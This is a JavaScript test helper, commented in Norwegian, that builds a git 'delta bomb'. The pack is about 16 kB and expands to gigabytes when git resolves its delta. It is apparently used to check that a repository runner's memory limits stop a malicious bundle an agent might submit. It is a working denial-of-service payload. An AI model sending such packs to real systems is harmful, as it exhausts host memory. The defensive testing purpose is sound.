import { createHash } from "node:crypto";
import { deflateSync } from "node:zlib";

/**
 * WP-C1 (test, A-F3): en «delta-bombe» - en liten git-pakke (ca. 16 kB) som ekspanderer til hundrevis av MiB (reviewerens målte variant: 16 700 B -> 1,52 GiB) når `index-pack` løser
 * deltaen. Pakken har to objekter: en 16 MiB nullfylt blob (komprimerer til ca. 16 kB) og en REF_DELTA mot den som kopierer hele basen `copies` ganger. `git` allokerer hele resultatet
 * (`copies * 16 MiB`) før det ekspanderes, så uten minnegrense tar den vertens minne, og med `prlimit --as` feiler den rent («Out of memory, malloc failed»).
 */

/** @param {number} n */
function varint(n) {
  const out = [];
  do {
    let b = n & 0x7f;
    n = Math.floor(n / 128);
    if (n > 0) b |= 0x80;
    out.push(b);
  } while (n > 0);
  return Buffer.from(out);
}

/** Objekthode i pakken: type i bit 6-4 og størrelse som varint (4 bit i første byte). @param {number} type @param {number} size */
function objectHeader(type, size) {
  const out = [];
  let b = (type << 4) | (size & 0x0f);
  size = Math.floor(size / 16);
  while (size > 0) {
    out.push(b | 0x80);
    b = size & 0x7f;
    size = Math.floor(size / 128);
  }
  out.push(b);
  return Buffer.from(out);
}

const BASE_SIZE = 16 * 1024 * 1024;
const COPY_BYTES = 0xffffff;

/** @param {number} copies antall kopier av basen (resultat = copies * 16 MiB - copies byte) */
export function deltaBombPack(copies) {
  const base = Buffer.alloc(BASE_SIZE);
  const baseSha = createHash("sha1").update(`blob ${BASE_SIZE}\0`).update(base).digest();
  const copy = Buffer.from([0xf0, 0xff, 0xff, 0xff]); // kopier 0xffffff byte fra offset 0
  const resultSize = copies * COPY_BYTES;
  const delta = Buffer.concat([varint(BASE_SIZE), varint(resultSize), ...Array.from({ length: copies }, () => copy)]);
  const body = Buffer.concat([
    Buffer.from("PACK"), Buffer.from([0, 0, 0, 2, 0, 0, 0, 2]),
    objectHeader(3, BASE_SIZE), deflateSync(base, { level: 9 }),
    objectHeader(7, delta.length), baseSha, deflateSync(delta)
  ]);
  return { pack: Buffer.concat([body, createHash("sha1").update(body).digest()]), resultSize };
}

/**
 * En komplett bundle (v2-header + bombepakke) som en agent kunne levert i stedet for `git bundle create`. `prerequisite` er basecommitten (runneren krever nøyaktig den).
 * @param {number} copies @param {string} prerequisite
 */
export function deltaBombBundle(copies, prerequisite) {
  const { pack, resultSize } = deltaBombPack(copies);
  return { bundle: Buffer.concat([Buffer.from(`# v2 git bundle\n-${prerequisite} base\n${"b".repeat(40)} HEAD\n\n`), pack]), resultSize };
}
